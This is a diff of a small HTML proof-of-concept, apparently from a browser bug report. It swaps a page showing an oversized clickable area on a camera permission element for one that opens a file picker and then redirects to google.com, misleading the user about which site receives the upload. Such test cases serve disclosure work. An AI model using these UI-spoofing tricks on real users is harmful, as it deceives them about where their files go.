@@ -1,50 +1,65 @@
-<!doctype html>
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>File Upload Misdirection PoC</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      padding: 20px;
+      text-align: center;
+    }
 
-<style>
-body {
-  background: #000;
-  color: white;
-  font-family: -apple-system, system-ui, sans-serif;
-  padding: 40px;
-}
+    button {
+      background-color: #007aff;
+      border: none;
+      color: white;
+      padding: 15px;
+      font-size: 16px;
+      cursor: pointer;
+      border-radius: 10px;
+      margin-top: 20px;
+    }
 
-/* Wrapper to show expected boundary */
-.box {
-  width: 220px;
-  height: 60px;
-  border: 2px dashed red;
-  margin-bottom: 40px;
-}
-
-/* Malformed permission styling */
-permission[type="camera"] {
-  display: block;
-  border-bottom: 100mm solid rgb(32,32,32);
-  border-top-left-radius: 99999px;
-  border-top-right-radius: 99999px;
-  background: #222;
-}
-</style>
+    img {
+      max-width: 100%;
+      margin-top: 20px;
+    }
+  </style>
 </head>
-
 <body>
 
-<h3>Expected clickable area = red box</h3>
+<h1>Tap to Upload Image</h1>
 
-<div class="box">
-  <permission type="camera">
-    Camera permission
-  </permission>
-</div>
+<!-- Simulated trusted site UI -->
+<button id="triggerButton">Upload Image</button>
 
-<p>
-The clickable / visible area of the permission control extends
-outside its visual container.
-</p>
+<img id="preview" style="max-width: 100%; margin-top: 20px;" />
+
+<script>
+  const triggerButton = document.getElementById('triggerButton');
+
+  // Trigger file picker and navigation
+  triggerButton.addEventListener('click', () => {
+    // Open file picker (showOpenFilePicker in compatible browsers)
+    showOpenFilePicker().then(([fileHandle]) => {
+      fileHandle.getFile().then(file => {
+        // Read the file (simulating image preview)
+        const reader = new FileReader();
+        reader.onload = function(e) {
+          document.getElementById('preview').src = e.target.result;
+        };
+        reader.readAsDataURL(file);
+      });
+    });
+
+    // Redirect to a trusted site (simulating trusted destination)
+    setTimeout(() => {
+      window.location.href = 'https://www.google.com';
+    }, 1000);  // Delay to show the file picker first
+  });
+</script>
 
 </body>
 </html>
